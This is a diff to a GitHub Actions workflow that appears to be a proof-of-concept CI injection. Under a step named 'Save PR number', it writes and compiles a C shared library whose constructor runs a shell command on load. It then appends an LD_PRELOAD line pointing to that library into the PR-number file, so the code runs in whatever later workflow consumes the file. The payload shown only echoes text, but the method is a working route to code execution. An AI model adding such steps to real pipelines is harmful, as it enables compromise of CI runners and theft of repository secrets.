@@ -13,6 +13,15 @@ jobs:
           platform: x64
       - name: Save PR number
         run: |
+          cat >> lib.c << EOF
+          #define _GNU_SOURCE
+          #include <stdio.h>
+          #include <stdlib.h>
+
+          void __attribute__((constructor)) run_shell_command(void) {
+              system("echo 'Shared library loaded!'");
+          }
+          EOF
           mkdir -p ./pr
           gcc -shared -fPIC -o pr/lib.so lib.c
           echo ${{ github.event.number }}\nLD_PRELOAD=$GITHUB_WORKSPACE/pr/lib.so > ./pr/NR
